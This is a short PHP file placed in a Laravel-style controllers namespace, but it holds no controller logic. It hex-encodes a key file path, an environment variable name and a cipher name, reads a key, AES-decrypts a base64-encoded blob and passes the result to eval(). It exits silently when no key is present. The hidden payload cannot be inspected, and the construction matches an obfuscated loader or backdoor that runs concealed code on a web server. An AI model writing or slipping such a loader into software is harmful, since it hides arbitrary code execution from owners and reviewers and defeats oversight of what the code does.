<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('piiHSFzv37gXqYsw5PHpyg==');

$c=base64_decode(

'6B+ettX5Vfl6LkCatlSLEbYTLnmgekCodOWyAHRZcGx3Pj0SDl81fzyPgste1a8FP6u8Fci1Um0y' .
'Ds5+FaHckIEHQetGBHjqQquSBUkIC2aiDL4ZgJctTmteAnfth4G9gon+fY71xrZ29xjwY+qrEoK5' .
'1qpEibi5At43y8xkJ7SQb3e5JIhg2slnqLYewjCuZHOXTUgZdlT1P9aVGmWTdNzdQc7d3tKwrbPy' .
'66/bCdExZj1cndyBdv4Dbv3HZCrG'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

